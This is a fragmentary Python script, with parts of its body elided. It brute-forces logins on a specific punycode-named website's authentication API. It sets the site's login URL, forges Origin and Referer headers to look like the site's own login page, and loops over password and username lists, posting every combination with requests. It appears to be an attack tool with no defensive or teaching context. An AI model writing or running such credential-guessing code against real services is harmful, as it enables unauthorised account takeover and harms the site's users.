...
LOGIN_URL = "https://xn--ehqx7tcnnope.com/api/v1/passport/auth/login"
USER_FIELD = "email"
PWD_FIELD = "password"
...
def main():
    ...
    with requests.Session() as session:
        ...
        session.headers.update({
            ...
            "Origin": "https://xn--ehqx7tcnnope.com",
            "Referer": "https://xn--ehqx7tcnnope.com/auth/login"
        })
        ...
        for password in passwords:
            ...
            for username in usernames:
                ...
                try:
                    ...
                    response = session.post(LOGIN_URL, data=payload, timeout=6)
